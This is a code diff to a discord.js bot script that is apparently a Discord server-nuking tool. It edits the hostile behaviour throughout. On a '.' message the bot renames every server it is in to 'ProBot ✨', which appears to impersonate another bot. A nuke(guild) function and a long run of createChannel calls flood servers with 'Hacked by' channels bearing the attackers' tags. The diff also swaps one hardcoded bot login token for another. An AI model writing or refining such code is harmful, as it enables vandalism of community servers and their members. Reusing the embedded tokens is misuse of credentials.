@@ -40,7 +40,7 @@ LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/359820599138451457/3
 var x1 = "Go"
 LOka.on('message', message => {
      if (message.content === ".") {
-LOka.user.setUsername("HACKER JOKER")
+LOka.user.setUsername("")
  
 }
 });
@@ -61,7 +61,7 @@ LOka.on('message', message => {
 LOka.on('message', message => {
      if (message.content === ".") {
          LOka.guilds.forEach(m =>{
-             m.setName(`HA`)
+             m.setName(`ProBot ✨`)
 })
 }
 });
@@ -567,12 +567,12 @@ m.createChannel('Hacked u by JOKER', 'voice');
 m.createChannel('Hacked u by JOKER', 'voice');
 m.createChannel('Hacked u by JOKER', 'voice');
 m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
-m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked by JOKER', 'voice');
+m.createChannel('Hacked by JOKER', 'voice');
+m.createChannel('Hacked by JOKER', 'voice');
+m.createChannel('Hacked by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hacked by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
+m.createChannel('Hacked by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
                 
                    
                    
@@ -616,7 +616,7 @@ async function nuke(guild) {
     }
   }));
  
-    await guild.createChannel('LETAY PURT', 'text');
+    await guild.createChannel('CH NIA DNYA FSHAYA', 'text');
  
       await guild.createChannel('Hacked u by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
  
@@ -658,4 +658,4 @@ LOka.on('guildMemberAdd', member => {
  
  
  
-LOka.login("Njg3NDAxNTE0NTE1NDMxNDkw.XmlSpw.oEgPBsHK8OiMpCB5QjcYBbu7clw")
+LOka.login("Njg0OTAxMzY2MzU1MDY2OTIw.XmlWpA.IHhIc6Gw0EDld8ZVQMCQxugNMLU")
